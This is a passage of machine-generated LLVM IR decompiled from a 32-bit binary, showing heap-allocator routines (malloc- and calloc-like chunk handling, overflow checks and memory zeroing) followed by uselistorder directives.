  store i32 %v0_80539ab, i32* %ecx.global-to-local, align 4
  %v1_8053b68 = and i32 %v1_8053b61, -8
  store i32 %v1_8053b68, i32* %eax.global-to-local, align 4
  %v1_8053b6d = or i32 %v1_8053b68, 1
  store i32 %v1_8053b6d, i32* @edx, align 4
  %v5_8053b70 = icmp ult i32 %v1_8053b68, 15
  store i32 %v1_8053b6d, i32* %v2_80539b4, align 4
  %v0_8053b76 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053b76 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b76 = add i32 %v0_8053b76, 4
  %v3_8053b76 = add i32 %v2_8053b76, %v1_8053b76
  %v4_8053b76 = inttoptr i32 %v3_8053b76 to i32*
  store i32 5, i32* %v4_8053b76, align 4
  %v0_8053b7e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053b7e = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b7e = add i32 %v0_8053b7e, 8
  %v3_8053b7e = add i32 %v2_8053b7e, %v1_8053b7e
  %v4_8053b7e = inttoptr i32 %v3_8053b7e to i32*
  store i32 5, i32* %v4_8053b7e, align 4
  br i1 %v5_8053b70, label %dec_label_pc_8053baf, label %dec_label_pc_8053b88

dec_label_pc_8053b88:                             ; preds = %dec_label_pc_8053b61
  %v0_8053b8b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053b8d = add i32 %v0_8053b8b, 8
  store i32 %v1_8053b8d, i32* %eax.global-to-local, align 4
  %v0_8053b90 = load i32, i32* @global_var_8057884.223, align 4
  store i32 %v0_8053b90, i32* @ebx, align 4
  store i32 %v1_8053b8d, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8057884.223, align 4
  %v1_8053ba1 = call i32 @function_80542d9(i32 %v1_8053b8d)
  store i32 %v1_8053ba1, i32* %eax.global-to-local, align 4
  %v0_8053ba6 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ba6, i32* @global_var_8057884.223, align 4
  br label %dec_label_pc_8053baf

dec_label_pc_8053baf:                             ; preds = %dec_label_pc_8053b61, %dec_label_pc_8053b46, %dec_label_pc_8053b41, %dec_label_pc_8053a70, %dec_label_pc_8053b88
  %v0_8053baf = load i32, i32* @global_var_80578a8.219, align 8
  store i32 %v0_8053baf, i32* %eax.global-to-local, align 4
  %v1_8053bb4 = load i32, i32* @global_var_80578ac.224, align 4
  %tmp133 = icmp ugt i32 %v0_8053baf, %v1_8053bb4
  br i1 %tmp133, label %dec_label_pc_8053bbc, label %dec_label_pc_8053bc1

dec_label_pc_8053bbc:                             ; preds = %dec_label_pc_8053baf
  store i32 %v0_8053baf, i32* @global_var_80578ac.224, align 4
  br label %dec_label_pc_8053bc1

dec_label_pc_8053bc1:                             ; preds = %dec_label_pc_8053baf, %dec_label_pc_8053bbc
  %v1_8053bc1 = load i32, i32* @global_var_80578a4.217, align 4
  %v2_8053bc1 = add i32 %v1_8053bc1, %v0_8053baf
  store i32 %v2_8053bc1, i32* %eax.global-to-local, align 4
  %v1_8053bc7 = load i32, i32* @global_var_80578b4.220, align 4
  %tmp134 = icmp ugt i32 %v2_8053bc1, %v1_8053bc7
  br i1 %tmp134, label %dec_label_pc_8053bcf, label %dec_label_pc_8053bd4

dec_label_pc_8053bcf:                             ; preds = %dec_label_pc_8053bc1
  store i32 %v2_8053bc1, i32* @global_var_80578b4.220, align 4
  br label %dec_label_pc_8053bd4

dec_label_pc_8053bd4:                             ; preds = %dec_label_pc_8053bc1, %dec_label_pc_8053bcf
  %v0_8053bd4 = load i32, i32* @global_var_805756c.207, align 4
  store i32 %v0_8053bd4, i32* @ebx, align 4
  %v1_8053bda = add i32 %v0_8053bd4, 4
  %v2_8053bda = inttoptr i32 %v1_8053bda to i32*
  %v3_8053bda = load i32, i32* %v2_8053bda, align 4
  %v1_8053bdd = and i32 %v3_8053bda, -4
  store i32 %v1_8053bdd, i32* %ecx.global-to-local, align 4
  %v10_8053be0 = icmp ult i32 %v1_8053bdd, %v1_805387d
  br i1 %v10_8053be0, label %dec_label_pc_8053c60, label %dec_label_pc_8053be6

dec_label_pc_8053be6:                             ; preds = %dec_label_pc_8053bd4
  store i32 %v1_8053908, i32* %esi.global-to-local, align 4
  %v2_8053bec = sub i32 %v1_8053bdd, %v1_8053908
  store i32 %v2_8053bec, i32* %ecx.global-to-local, align 4
  %v2_8053bee = add i32 %v0_8053bd4, %v1_8053908
  store i32 %v2_8053bee, i32* @edx, align 4
  %v1_8053bf1 = or i32 %v1_8053908, 1
  store i32 %v1_8053bf1, i32* %eax.global-to-local, align 4
  store i32 %v2_8053bee, i32* @global_var_805756c.207, align 4
  store i32 %v1_8053bf1, i32* %v2_8053bda, align 4
  %v0_8053bfd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053bfd

dec_label_pc_8053bfd:                             ; preds = %dec_label_pc_805388e, %dec_label_pc_8053be6
  %v0_8053bfd = phi i32 [ %v5_80538a1, %dec_label_pc_805388e ], [ %v0_8053bfd.pre, %dec_label_pc_8053be6 ]
  %v1_8053bfd = or i32 %v0_8053bfd, 1
  store i32 %v1_8053bfd, i32* %ecx.global-to-local, align 4
  %v0_8053c00 = load i32, i32* @ebx, align 4
  %v1_8053c00 = add i32 %v0_8053c00, 8
  store i32 %v1_8053c00, i32* %ebx.global-to-local, align 4
  %v1_8053c03 = load i32, i32* @edx, align 4
  %v2_8053c03 = add i32 %v1_8053c03, 4
  %v3_8053c03 = inttoptr i32 %v2_8053c03 to i32*
  store i32 %v1_8053bfd, i32* %v3_8053c03, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_8053c08:                             ; preds = %dec_label_pc_8053648
  %v5_8053c0e = sub i32 %v1_805362b, %v1_8053908
  store i32 %v5_8053c0e, i32* %eax.global-to-local, align 4
  %v2_8053c12 = add i32 %v1_8053c1f, %v1_8053908
  store i32 %v2_8053c12, i32* @edx, align 4
  %v1_8053c16 = or i32 %v1_8053908, 1
  store i32 %v2_8053c12, i32* @global_var_8057570.208, align 16
  store i32 %v1_8053c16, i32* %v2_8053625, align 4
  %v0_8053c22 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053c24 = load i32, i32* @edx, align 4
  store i32 %v0_8053c24, i32* @global_var_805757c.225, align 4
  %v1_8053c2a = or i32 %v0_8053c22, 1
  store i32 %v1_8053c2a, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053c24, i32* @global_var_8057580.210, align 128
  %v1_8053c33 = add i32 %v0_8053c24, 8
  %v2_8053c33 = inttoptr i32 %v1_8053c33 to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_8053c33, align 4
  %v0_8053c3a = load i32, i32* @edx, align 4
  %v1_8053c3a = add i32 %v0_8053c3a, 12
  %v2_8053c3a = inttoptr i32 %v1_8053c3a to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_8053c3a, align 4
  %v0_8053c41 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053c41 = load i32, i32* @edx, align 4
  %v2_8053c41 = add i32 %v1_8053c41, 4
  %v3_8053c41 = inttoptr i32 %v2_8053c41 to i32*
  store i32 %v0_8053c41, i32* %v3_8053c41, align 4
  %v0_8053c44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c44 = load i32, i32* @edx, align 4
  %v3_8053c44 = add i32 %v1_8053c44, %v0_8053c44
  %v4_8053c44 = inttoptr i32 %v3_8053c44 to i32*
  store i32 %v0_8053c44, i32* %v4_8053c44, align 4
  br label %dec_label_pc_8053c52

dec_label_pc_8053c49:                             ; preds = %dec_label_pc_8053657
  store i32 %v1_8053908, i32* %ebx.global-to-local, align 4
  %v0_8053c4d = load i32, i32* @ebp, align 4
  %v2_8053c4d = or i32 %v1_8053908, 4
  %v3_8053c4d = add i32 %v0_8053c4d, %v2_8053c4d
  %v4_8053c4d = inttoptr i32 %v3_8053c4d to i32*
  %v5_8053c4d = load i32, i32* %v4_8053c4d, align 4
  %v6_8053c4d = or i32 %v5_8053c4d, 1
  store i32 %v6_8053c4d, i32* %v4_8053c4d, align 4
  br label %dec_label_pc_8053c52

dec_label_pc_8053c52:                             ; preds = %dec_label_pc_8053c08, %dec_label_pc_8053c49
  %v0_8053c52 = load i32, i32* @ebp, align 4
  %v1_8053c52 = add i32 %v0_8053c52, 8
  store i32 %v1_8053c52, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_8053c57:                             ; preds = %dec_label_pc_8053747
  %v1_8053c57 = load i32, i32* @ebx, align 4
  %v2_8053c57 = add i32 %v0_8053756, 4
  %v3_8053c57 = add i32 %v2_8053c57, %v1_8053c57
  %v4_8053c57 = inttoptr i32 %v3_8053c57 to i32*
  %v5_8053c57 = load i32, i32* %v4_8053c57, align 4
  %v6_8053c57 = or i32 %v5_8053c57, 1
  store i32 %v6_8053c57, i32* %v4_8053c57, align 4
  br label %dec_label_pc_8053c5c

dec_label_pc_8053c5c:                             ; preds = %dec_label_pc_805375f, %dec_label_pc_8053c57
  %v0_8053c5c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053c5c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_8053c60:                             ; preds = %dec_label_pc_8053a1e, %dec_label_pc_8053bd4, %dec_label_pc_8053a28
  %v0_8053c60 = load i32, i32* %stack_var_-92, align 4
  %v1_8053c60 = call i32 @function_80530b9(i32 %v0_8053c60)
  store i32 %v1_8053c60, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053c67 = inttoptr i32 %v1_8053c60 to i32*
  store i32 12, i32* %v1_8053c67, align 4
  br label %dec_label_pc_8053c6d

dec_label_pc_8053c6d:                             ; preds = %dec_label_pc_8053c5c, %dec_label_pc_8053c52, %dec_label_pc_8053bfd, %dec_label_pc_80538b9, %dec_label_pc_805386b, %dec_label_pc_80535f2, %dec_label_pc_8053c60
  store i32 %v2_8053529, i32* @eax, align 4
  store i32 %v2_8053529, i32* %stack_var_-92, align 4
  %v2_8053c76 = call i32 @function_8054a40(i32 %v2_8053529, i32 1)
  store i32 %v2_8053c76, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c7e

dec_label_pc_8053c7e:                             ; preds = %dec_label_pc_8053547, %dec_label_pc_8053c6d
  %v0_8053c81 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053c81, i32* %eax.global-to-local, align 4
  store i32 %v0_8053516, i32* @esi, align 4
  store i32 %v0_8053515, i32* @edi, align 4
  store i32 %v0_8053514, i32* @ebp, align 4
  ret i32 %v0_8053c81

; uselistorder directives
  uselistorder i32 %v0_8053c44, { 1, 0 }
  uselistorder i32 %v0_8053c24, { 1, 0, 2 }
  uselistorder i32 %v2_8053bc1, { 1, 0, 2 }
  uselistorder i32 %v0_8053baf, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053b46, { 1, 0 }
  uselistorder i32 %v2_8053b34, { 1, 0 }
  uselistorder i32 %v1_8053aeb, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8053ad5, { 1, 0, 2 }
  uselistorder i32 %v2_8053ac9, { 1, 2, 0 }
  uselistorder i32 %v2_8053ac4, { 1, 0, 2 }
  uselistorder i32 %v1_8053ab4, { 2, 1, 0 }
  uselistorder i8 %v0_8053a82, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053a65, { 1, 0, 2 }
  uselistorder i32 %v0_8053b1993, { 2, 0, 1 }
  uselistorder i32 %v0_8053b2794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8053a5f, { 2, 1, 0 }
  uselistorder i32 %v8_8053a35, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053a32, { 1, 0 }
  uselistorder i32 %v0_8053a11, { 1, 0 }
  uselistorder i32 %v2_80539e2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80539da, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80539c7, { 1, 0 }
  uselistorder i1 %v2_80539be, { 2, 1, 0 }
  uselistorder i32 %v1_80539be, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80539ab, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805398f, { 1, 0, 2 }
  uselistorder i32 %v2_805397b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053944, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053938, { 2, 1, 0 }
  uselistorder i32 %v8_8053927, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_805390e, { 1, 0, 2 }
  uselistorder i32 %v0_80538aa, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805387d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053873, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8053865, { 1, 0 }
  uselistorder i32 %v1_80537fc, { 1, 0 }
  uselistorder i32 %v3_80537f0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8053800, { 1, 0 }
  uselistorder i32 %v2_80537ea, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80537e77, { 1, 0 }
  uselistorder i32 %v2_80537dc, { 1, 0 }
  uselistorder i32 %v1_80537c0, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80537bc, { 2, 1, 0 }
  uselistorder i32 %v1_80537b8, { 1, 0 }
  uselistorder i32 %v1_80537ac, { 2, 1, 0 }
  uselistorder i32 %v2_80537a2, { 1, 0 }
  uselistorder i32 %v1_805379f, { 1, 2, 0 }
  uselistorder i32 %v4_805373d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8053788, { 1, 0 }
  uselistorder i32 %v0_8053756, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8053729, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80536f6, { 0, 2, 1 }
  uselistorder i32 %v2_80536da, { 1, 0 }
  uselistorder i32 %v1_80536d0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80536cb.lcssa, { 1, 0 }
  uselistorder i32 %v3_80536bb, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80536b2, { 1, 0, 2 }
  uselistorder i32 %v2_805368e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8053676, { 2, 1, 0 }
  uselistorder i32 %v0_8053662, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8053628, { 1, 0, 2 }
  uselistorder i32 %v1_8053c1f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80536f69, { 1, 0, 2 }
  uselistorder i32 %v3_80535d5, { 1, 0, 2 }
  uselistorder i32 %v2_80535c7, { 2, 1, 0 }
  uselistorder i32 %v2_80535a2, { 2, 1, 0 }
  uselistorder i8 %v0_8053570, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8053908, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8053559, { 0, 2, 1 }
  uselistorder i32 %v0_8053542, { 1, 0 }
  uselistorder i32 %v2_8053529, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80578a0.222, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8054d58, { 1, 0 }
  uselistorder i32 134575476, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8057580.210, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_80534ee, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805756c.207 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805756c.207 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053c7e, { 1, 0 }
  uselistorder label %dec_label_pc_8053c6d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053c60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053c5c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c52, { 1, 0 }
  uselistorder label %dec_label_pc_8053bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd4, { 1, 0 }
  uselistorder label %dec_label_pc_8053bc1, { 1, 0 }
  uselistorder label %dec_label_pc_8053baf, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053b41, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053b3c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b20, { 1, 0 }
  uselistorder label %dec_label_pc_8053ac9, { 1, 0 }
  uselistorder label %dec_label_pc_8053ab2, { 1, 0 }
  uselistorder label %dec_label_pc_8053a9b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053a1e, { 1, 0 }
  uselistorder label %dec_label_pc_8053a11, { 1, 0 }
  uselistorder label %dec_label_pc_80539d2, { 1, 0 }
  uselistorder label %dec_label_pc_80539ab, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805398f, { 1, 0 }
  uselistorder label %dec_label_pc_8053976, { 1, 0 }
  uselistorder label %dec_label_pc_8053958, { 1, 0 }
  uselistorder label %dec_label_pc_8053873, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805386b, { 1, 0 }
  uselistorder label %dec_label_pc_8053854, { 1, 0 }
  uselistorder label %dec_label_pc_80537e7, { 1, 0 }
  uselistorder label %dec_label_pc_80537ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80537c0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053747, { 1, 0 }
  uselistorder label %dec_label_pc_80536f6, { 1, 0 }
  uselistorder label %dec_label_pc_80536ce, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80536b7, { 1, 0 }
  uselistorder label %dec_label_pc_8053625, { 1, 0 }
  uselistorder label %dec_label_pc_80536f6.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80535f2, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8053570, { 1, 0 }
}

define i32 @function_8053c88(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053c88:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8053c88 = load i32, i32* @edi, align 4
  %v0_8053c8a = load i32, i32* @ebx, align 4
  %v12_8053c8b = ptrtoint i32* %stack_var_-28 to i32
  %v4_8053c8e = trunc i64 %arg1 to i32
  store i32 %v4_8053c8e, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8053c98 = sdiv i64 %sext, 4294967296
  %v3_8053c98 = sext i32 %arg2 to i64
  %v4_8053c98 = mul nsw i64 %v3_8053c98, %v2_8053c98
  %v5_8053c98 = trunc i64 %v4_8053c98 to i32
  store i32 %v5_8053c98, i32* @ebx, align 4
  %v2_8053c9b = icmp eq i32 %v4_8053c8e, 0
  br i1 %v2_8053c9b, label %dec_label_pc_8053cbd, label %dec_label_pc_8053c9f

dec_label_pc_8053c9f:                             ; preds = %dec_label_pc_8053c88
  store i32 %v4_8053c8e, i32* @edi, align 4
  %div = udiv i32 %v5_8053c98, %v4_8053c8e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_8053c98, %v4_8053c8e
  store i32 %tmp14, i32* @edx, align 4
  %v12_8053ca7 = icmp eq i32 %div, %arg2
  br i1 %v12_8053ca7, label %dec_label_pc_8053cbd, label %dec_label_pc_8053cab

dec_label_pc_8053cab:                             ; preds = %dec_label_pc_8053c9f
  %v1_8053cab = call i32 @function_80530b9(i32 %v0_8053c8a)
  store i32 %v1_8053cab, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053cb2 = inttoptr i32 %v1_8053cab to i32*
  store i32 12, i32* %v1_8053cb2, align 4
  br label %dec_label_pc_8053d73

dec_label_pc_8053cbd:                             ; preds = %dec_label_pc_8053c9f, %dec_label_pc_8053c88
  store i32 %v12_8053c8b, i32* @eax, align 4
  %v2_8053ccd = call i32 @function_8054a40(i32 %v12_8053c8b, i32 134564413)
  store i32 %v2_8053ccd, i32* %eax.global-to-local, align 4
  %v1_8053cd9 = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571a0.205 to i32))
  store i32 %v1_8053cd9, i32* %eax.global-to-local, align 4
  %v0_8053cde = load i32, i32* @ebx, align 4
  %v1_8053ce1 = call i32 @function_8053514(i32 %v0_8053cde)
  store i32 %v1_8053ce1, i32* %eax.global-to-local, align 4
  store i32 %v1_8053ce1, i32* %ebx.global-to-local, align 4
  %v1_8053ceb = icmp eq i32 %v1_8053ce1, 0
  br i1 %v1_8053ceb, label %dec_label_pc_8053d62, label %dec_label_pc_8053cef

dec_label_pc_8053cef:                             ; preds = %dec_label_pc_8053cbd
  %v1_8053cef = add i32 %v1_8053ce1, -4
  %v2_8053cef = inttoptr i32 %v1_8053cef to i32*
  %v3_8053cef = load i32, i32* %v2_8053cef, align 4
  store i32 %v3_8053cef, i32* %eax.global-to-local, align 4
  %v2_8053cf2 = and i32 %v3_8053cef, 2
  %v3_8053cf2 = icmp eq i32 %v2_8053cf2, 0
  %v1_8053cf4 = icmp eq i1 %v3_8053cf2, false
  br i1 %v1_8053cf4, label %dec_label_pc_8053d62, label %dec_label_pc_8053cf6

dec_label_pc_8053cf6:                             ; preds = %dec_label_pc_8053cef
  %v1_8053cf63 = add i32 %v3_8053cef, -4
  %v1_8053cf9 = and i32 %v1_8053cf63, -4
  store i32 %v1_8053cf9, i32* @edx, align 4
  %v2_8053cfe = udiv i32 %v1_8053cf9, 4
  store i32 %v2_8053cfe, i32* %eax.global-to-local, align 4
  %v5_8053d01 = icmp ult i32 %v1_8053cf9, 36
  %tmp = and i32 %v1_8053cf63, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8053d04 = or i1 %v5_8053d01, %tmp18
  br i1 %v2_8053d04, label %dec_label_pc_8053d15, label %dec_label_pc_8053d06

dec_label_pc_8053d06:                             ; preds = %dec_label_pc_8053cf6
  %v3_8053d0b = inttoptr i32 %v1_8053ce1 to i8*
  %v4_8053d0b = call i32 @function_805310a(i8* %v3_8053d0b, i32 0, i32 %v1_8053cf9)
  store i32 %v4_8053d0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d62

dec_label_pc_8053d15:                             ; preds = %dec_label_pc_8053cf6
  %v1_8053d15 = inttoptr i32 %v1_8053ce1 to i32*
  store i32 0, i32* %v1_8053d15, align 4
  %v0_8053d1b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d1b = add i32 %v0_8053d1b, 4
  %v2_8053d1b = inttoptr i32 %v1_8053d1b to i32*
  store i32 0, i32* %v2_8053d1b, align 4
  %v0_8053d22 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d22 = add i32 %v0_8053d22, 8
  %v2_8053d22 = inttoptr i32 %v1_8053d22 to i32*
  store i32 0, i32* %v2_8053d22, align 4
  %v0_8053d29 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8053d29, 5
  br i1 %tmp15, label %dec_label_pc_8053d62, label %dec_label_pc_8053d2e

dec_label_pc_8053d2e:                             ; preds = %dec_label_pc_8053d15
  %v0_8053d2e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d2e = add i32 %v0_8053d2e, 12
  %v2_8053d2e = inttoptr i32 %v1_8053d2e to i32*
  store i32 0, i32* %v2_8053d2e, align 4
  %v0_8053d35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d35 = add i32 %v0_8053d35, 16
  %v2_8053d35 = inttoptr i32 %v1_8053d35 to i32*
  store i32 0, i32* %v2_8053d35, align 4
  %v0_8053d3c = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8053d3c, 7
  br i1 %tmp16, label %dec_label_pc_8053d62, label %dec_label_pc_8053d41

dec_label_pc_8053d41:                             ; preds = %dec_label_pc_8053d2e
  %v0_8053d41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d41 = add i32 %v0_8053d41, 20
  %v2_8053d41 = inttoptr i32 %v1_8053d41 to i32*
  store i32 0, i32* %v2_8053d41, align 4
  %v0_8053d48 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d48 = add i32 %v0_8053d48, 24
  %v2_8053d48 = inttoptr i32 %v1_8053d48 to i32*
  store i32 0, i32* %v2_8053d48, align 4
  %v0_8053d4f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8053d4f, 9
  br i1 %tmp17, label %dec_label_pc_8053d62, label %dec_label_pc_8053d54

dec_label_pc_8053d54:                             ; preds = %dec_label_pc_8053d41
  %v0_8053d54 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d54 = add i32 %v0_8053d54, 28
  %v2_8053d54 = inttoptr i32 %v1_8053d54 to i32*
  store i32 0, i32* %v2_8053d54, align 4
  %v0_8053d5b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d5b = add i32 %v0_8053d5b, 32
  %v2_8053d5b = inttoptr i32 %v1_8053d5b to i32*
  store i32 0, i32* %v2_8053d5b, align 4
  br label %dec_label_pc_8053d62

dec_label_pc_8053d62:                             ; preds = %dec_label_pc_8053d41, %dec_label_pc_8053d2e, %dec_label_pc_8053d15, %dec_label_pc_8053cef, %dec_label_pc_8053cbd, %dec_label_pc_8053d06, %dec_label_pc_8053d54
  store i32 %v12_8053c8b, i32* @eax, align 4
  %v2_8053d6b = call i32 @function_8054a40(i32 %v12_8053c8b, i32 1)
  store i32 %v2_8053d6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d73

dec_label_pc_8053d73:                             ; preds = %dec_label_pc_8053cab, %dec_label_pc_8053d62
  %v0_8053d76 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d76, i32* %eax.global-to-local, align 4
  store i32 %v0_8053c8a, i32* @ebx, align 4
  store i32 %v0_8053c88, i32* @edi, align 4
  ret i32 %v0_8053d76

; uselistorder directives
  uselistorder i32 %v1_8053cf9, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8053ce1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8053c98, { 1, 0, 2 }
  uselistorder i32 %v4_8053c8e, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053d73, { 1, 0 }
  uselistorder label %dec_label_pc_8053d62, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8053d7c() local_unnamed_addr {
dec_label_pc_8053d7c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053d7c = load i32, i32* @ebp, align 4
  %v0_8053d7d = load i32, i32* @edi, align 4
  %v0_8053d7e = load i32, i32* @esi, align 4
  %v0_8053d7f = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8053d87 = icmp eq i32 %tmp6, 0
  %v1_8053d8c = icmp eq i1 %v4_8053d87, false
  br i1 %v1_8053d8c, label %dec_label_pc_8053d9e, label %dec_label_pc_8053d8e

dec_label_pc_8053d8e:                             ; preds = %dec_label_pc_8053d7c
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8053d92 = call i32 @function_8053514(i32 %tmp7)
  store i32 %v1_8053d92, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d92, i32* @ebx, align 4
  br label %dec_label_pc_8054097

dec_label_pc_8053d9e:                             ; preds = %dec_label_pc_8053d7c
  %v1_8053d9e = icmp eq i32 %tmp7, 0
